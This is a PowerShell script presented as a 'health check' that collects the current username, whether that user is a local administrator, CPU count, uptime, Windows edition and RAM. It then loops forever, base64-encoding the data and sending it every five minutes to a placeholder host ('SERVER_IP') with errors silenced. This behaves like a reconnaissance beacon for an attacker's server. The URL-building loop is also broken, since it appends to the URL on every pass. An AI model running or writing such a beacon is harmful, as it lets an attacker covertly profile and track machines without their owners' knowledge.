<#
X_# CODED By MachineGun 
O_X Friday, July 19, 2024 7:46:00 PM
#_# This Script Designed To Do A health Check

                  _________-----_____
       _____------           __      ----_
___----             ___------              \
   ----________        ----                 \
               -----__    |             _____)
                    __-                /     \
        _______-----    ___--          \    /)\
  ------_______      ---____            \__/  /
               -----__    \ --    _          /\
                      --__--__     \_____/   \_/\
                              ----|   /          |
                                  |  |___________|
                                  |  | ((_(_)| )_)
                                  |  \_((_(_)|/(_)
                                  \             (
                                   \_____________)
#>
#########################


#Let's Gather Needed Information For Our Self 

$username = $env:USERNAME
$admins = net localgroup Administrators
$computer_info = @()

#Check AdminRights
if ($admins -contains $username) {
    $adminStatus = "AdminstratorGroup"

}else{
    $adminStatus = "NotAdmin"
}


#Createa A Function For Reciving The Data 


function Get-Yoyo {
    $hardware_information = Get-ComputerInfo | Select-Object -Property CsNumberOfLogicalProcessors, OsUptime, WindowsProductName, OsTotalVisibleMemorySize 
    $info = @{
        Username = "$username/$adminStatus"
        Processors = $hardware_information.CsNumberOfLogicalProcessors
        Uptime = ($hardware_information.OsUptime -split ":")[0]
        ProductName = $hardware_information.WindowsProductName
        RAM = $hardware_information.OsTotalVisibleMemorySize
        Status = "Online"
    }
    return $info
}
#Let's Gather HardWare Information 





$computer_info = Get-Yoyo

#reciver_Server
$url = "http://SERVER_IP/"





while($true){
    
    try {
        $computer_info
        $jsonContent = $computer_info | ConvertTo-Json
        $base64Content = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($jsonContent))
        $url += $base64Content
        Invoke-WebRequest -Uri $url -ErrorAction SilentlyContinue -OutFile $null
        
        
    } catch {
        
        Start-Sleep -Seconds 10
    
    }finally {
        # Ensure the script waits for 300 seconds before the next iteration
        Start-Sleep -Seconds 300
    }
    
}




###############